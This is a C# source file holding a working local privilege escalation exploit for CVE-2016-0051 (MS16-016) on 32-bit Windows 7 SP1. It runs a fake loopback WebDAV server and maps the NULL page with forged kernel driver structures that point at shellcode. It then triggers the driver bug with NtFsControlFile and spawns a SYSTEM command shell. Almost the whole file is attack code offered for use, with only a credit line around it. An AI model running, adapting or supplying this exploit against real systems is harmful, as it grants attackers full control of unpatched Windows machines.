﻿/*

Elevation of Privilege (SYSTEM) exploit for CVE-2016-0051 (MS16-016) for Windows 7 SP1 x86 (build 7601)
Creator: Tamás Koczka (@koczkatamas - https://twitter.com/koczkatamas)
Original source: https://github.com/koczkatamas/CVE-2016-0051

*/
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace EoP
{
    class Program
    {
        #region Fake WebDAV server

        static void StartFakeWebDavServer(int port)
        {
            new Thread(() =>
            {
                var server = new TcpListener(IPAddress.Loopback, port);
                server.Start();
                while (true)
                {
                    using (var client = server.AcceptTcpClient())
                    using (var stream = client.GetStream())
                    using (var reader = new StreamReader(stream, Encoding.GetEncoding("iso-8859-1")))
                    using (var writer = new StreamWriter(stream, Encoding.GetEncoding("iso-8859-1")) { AutoFlush = true })
                    {
                        Func<string> rl = () =>
                        {
                            var line = reader.ReadLine();
                            //Console.WriteLine("< " + line);
                            return line;
                        };

                        Action<string> wl = outData =>
                        {
                            //Console.WriteLine(String.Join("\n", outData.Split('\n').Select(x => "> " + x)));
                            writer.Write(outData);
                        };

                        var hdrLine = rl();
                        Console.WriteLine("[*] Request: " + hdrLine);

                        var header = hdrLine.Split(' ');
                        while (!string.IsNullOrEmpty(rl())) { }

                        if (header[0] == "OPTIONS")
                            wl("HTTP/1.1 200 OK\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nAllow: OPTIONS,GET,HEAD,PROPFIND\r\n\r\n");
                        else if (header[0] == "PROPFIND")
                        {
                            var body = String.Format(@"
<?xml version=""1.0"" encoding=""UTF-8""?>
<D:multistatus xmlns:D=""DAV:"">
<D:response>
    <D:href>{0}</D:href>
    <D:propstat>
        <D:prop>
            <D:creationdate>{1:s}Z</D:creationdate>
            <D:getcontentlength>{3}</D:getcontentlength>
            <D:getcontenttype>{4}</D:getcontenttype>
            <D:getetag>{5}</D:getetag>
            <D:getlastmodified>{6:R}</D:getlastmodified>
            <D:resourcetype>{8}</D:resourcetype>
            <D:supportedlock></D:supportedlock>
            <D:ishidden>{7}</D:ishidden>
        </D:prop>
        <D:status>HTTP/1.1 200 OK</D:status>
    </D:propstat>
</D:response>
</D:multistatus>", header[1], DateTime.UtcNow.ToUniversalTime(), "", "0", "", "", DateTime.UtcNow.ToUniversalTime(), 0, header[1].Contains("file") ? "" : "<D:collection></D:collection>").Trim();

                            wl("HTTP/1.1 207 Multi-Status\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nContent-Length: " + body.Length + "\r\nContent-Type: text/xml\r\n\r\n" + body);
                        }
                        else
                            wl("HTTP/1.1 500 Internal Server Error\r\n\r\n");

                        //Console.WriteLine(" =============== END REQUEST =============== ");
                    }
                }
            }) { IsBackground = true, Name = "WebDAV server thread" }.Start();
        }

        #endregion

        #region WinAPI

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr securityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [StructLayout(LayoutKind.Sequential)]
        private class NETRESOURCE
        {
            public uint dwScope = 0;
            public uint dwType = 0;
            public uint dwDisplayType = 0;
            public uint dwUsage = 0;
            public string lpLocalName = null;
            public string lpRemoteName = null;
            public string lpComment = null;
            public string lpProvider = null;
        }

        [DllImport("mpr.dll")]
        private static extern int WNetAddConnection2(NETRESOURCE lpNetResource, string lpPassword, string lpUsername, int dwFlags);

        // based on http://www.codeproject.com/Articles/21974/Windows-NT-Native-API-Wrapper-Library

        public enum PageProtection : uint
        {
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            GUARD = 0x100,
            NOCACHE = 0x200,
            WRITECOMBINE = 0x400
        }

        [Flags]
        public enum MemoryAllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            FREE = 0x10000,
            PRIVATE = 0x20000,
            MAPPED = 0x40000,
            RESET = 0x80000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000,
            ROTATE = 0x800000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            FOUR_MB_PAGES = 0x80000000
        }

        [DllImport("ntdll.dll", ThrowOnUnmappableChar = true, BestFitMapping = false, SetLastError = false)]
        public static extern NtStatus NtAllocateVirtualMemory([In] IntPtr processHandle, [In, Out] ref IntPtr baseAddress, [In] uint zeroBits, [In, Out] ref UIntPtr regionSize, [In] MemoryAllocationType allocationType, [In] PageProtection protect);

        public enum FileOpenInformation
        {
            Superceded = 0x00000000,
            Opened = 0x00000001,
            Created = 0x00000002,
            Overwritten = 0x00000003,
            Exists = 0x00000004,
            DoesNotExist = 0x00000005
        }

        internal enum NtStatus : uint
        {
            SUCCESS = 0x00000000,
            INVALID_PARAMETER_1 = 0xC00000EF,
            INVALID_PARAMETER_2 = 0xC00000F0,
            INVALID_PARAMETER_3 = 0xC00000F1,
            INVALID_PARAMETER_4 = 0xC00000F2,
            // don't care
        }

        internal struct IoStatusBlock
        {
            public NtStatus status;
            public InformationUnion Information;

            [StructLayout(LayoutKind.Explicit)]
            public struct InformationUnion
            {
                [FieldOffset(0)]
                public FileOpenInformation FileOpenInformation;
                [FieldOffset(0)]
                public uint BytesWritten;
                [FieldOffset(0)]
                public uint BytesRead;
            }
        }

        [DllImport("ntdll.dll", ThrowOnUnmappableChar = true, BestFitMapping = false, SetLastError = false, ExactSpelling = true, PreserveSig = true)]
        public static extern NtStatus NtFsControlFile([In] IntPtr fileHandle, [In, Optional] IntPtr Event, [In, Optional] IntPtr apcRoutine, [In, Optional] IntPtr apcContext, [Out] out IoStatusBlock ioStatusBlock, [In] uint fsControlCode, [In, Optional] IntPtr inputBuffer, [In] uint inputBufferLength, [Out, Optional] IntPtr outputBuffer, [In] uint outputBufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int LoadAndGetKernelBasePtr();

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        #endregion

        private static byte[] il(params uint[] inp) { return inp.SelectMany(BitConverter.GetBytes).ToArray(); }
        private static byte[] z(int c) { return rep(0, c); }
        private static byte[] rep(byte b, int c) { return Enumerable.Repeat(b, c).ToArray(); }
        private static byte[] fl(byte[][] inp) { return inp.SelectMany(x => x).ToArray(); }

        public static void Main(string[] args)
        {
            var shellcodeDll = LoadLibrary("shellcode.dll");
            var shellcodeFunc = GetProcAddress(shellcodeDll, "_shellcode@8");

            var loadAndGetKernelBaseFunc = GetProcAddress(shellcodeDll, "_LoadAndGetKernelBase@0");
            var loadAndGetKernelBase = (LoadAndGetKernelBasePtr)Marshal.GetDelegateForFunctionPointer(loadAndGetKernelBaseFunc, typeof(LoadAndGetKernelBasePtr));

            var loadResult = loadAndGetKernelBase();
            Console.WriteLine($"[*] LoadAndGetKernelBase result = {loadResult}");

            var addr = new IntPtr(0x1000);
            var size = new UIntPtr(0x4000);
            var result = NtAllocateVirtualMemory(new IntPtr(-1), ref addr, 0, ref size, MemoryAllocationType.RESERVE | MemoryAllocationType.COMMIT, PageProtection.READWRITE);
            Console.WriteLine($"[*] NtAllocateVirtualMemory result = {result}, addr = {addr}, size = {size}");

            if (result != NtStatus.SUCCESS || loadResult != 0)
                Console.WriteLine("[-] Fail... so sad :(");
            else
            {
                Console.WriteLine("[*] Creating fake DeviceObject, DriverObject, etc structures...");
                var payload = fl(new[] { z(8), /* [0x8]DriverObject=0 */ il(0), z(0x30 - 8 - 4), /* [0x30]StackSize=256 */ il(0x10, 0), z(13 * 4), il((uint)shellcodeFunc.ToInt32()) });
                Marshal.Copy(payload, 1, new IntPtr(1), payload.Length - 1);

                var p = new Random().Next(1024, 65535);
                Console.WriteLine("[*] Starting fake webdav server...");
                StartFakeWebDavServer(p);

                Console.WriteLine("[*] Calling WNetAddConnection2...");
                var addConnectionResult = WNetAddConnection2(new NETRESOURCE { lpRemoteName = $@"\\127.0.0.1@{p}\folder\" }, null, null, 0);
                Console.WriteLine("[*] WNetAddConnection2 = " + addConnectionResult);

                var fileHandle = CreateFile($@"\\127.0.0.1@{p}\folder\file", 0x80, 7, IntPtr.Zero, 3, 0, IntPtr.Zero);
                Console.WriteLine($"[*] CreateFile result = {fileHandle}");
                
                IoStatusBlock ioStatusBlock;
                var inputLen = 24;
                var inputPtr = Marshal.AllocHGlobal(inputLen);
                var outputLen = 4;
                var outputPtr = Marshal.AllocHGlobal(outputLen);
                var controlResult = NtFsControlFile(fileHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out ioStatusBlock, 0x900DBu, inputPtr, (uint)inputLen, outputPtr, (uint)outputLen);
                Console.WriteLine($"[*] NtFsControlFile result = {controlResult}");

                var identity = WindowsIdentity.GetCurrent();
                if (identity?.IsSystem == true)
                {
                    Console.WriteLine("[+] Got SYSTEM! Spawning a shell...");
                    Process.Start("cmd");
                }
                else
                    Console.WriteLine($"[-] Something went wrong, looks like we are not SYSTEM :(, only {identity?.Name}...");
            }

            Console.WriteLine("");
            Console.WriteLine("Press ENTER to exit.");
            Console.ReadLine();
        }
    }
}
